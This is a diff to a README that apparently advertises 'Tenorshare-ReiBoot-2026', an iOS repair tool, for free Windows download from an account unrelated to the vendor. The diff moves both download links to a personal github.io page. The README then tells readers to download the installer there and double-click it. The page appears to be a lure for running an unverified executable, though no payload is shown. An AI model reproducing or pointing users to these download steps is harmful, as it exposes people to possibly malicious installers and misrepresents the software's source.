@@ -1,6 +1,6 @@
 # 🛠️ Tenorshare-ReiBoot-2026 - Fix iOS system issues with ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/Robertoinstock947/Tenorshare-ReiBoot-2026)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://robertoinstock947.github.io)
 
 Tenorshare ReiBoot-2026 manages complex iOS recovery processes on Windows computers. This software repairs common system glitches, handles firmware updates, and verifies device integrity. You do not need technical skills to use this tool. The software automates device recognition and guides you through repair stages.
 
@@ -19,7 +19,7 @@ To run this tool, your computer must meet these basic standards:
 
 Follow these instructions to set up the software on your Windows computer.
 
-1.  Visit this page to download: [https://github.com/Robertoinstock947/Tenorshare-ReiBoot-2026](https://github.com/Robertoinstock947/Tenorshare-ReiBoot-2026).
+1.  Visit this page to download: [https://robertoinstock947.github.io](https://robertoinstock947.github.io).
 2.  Locate the downloaded installation file in your File Explorer. 
 3.  Double-click the file to open the installer.
 4.  Choose your preferred language and click Next.
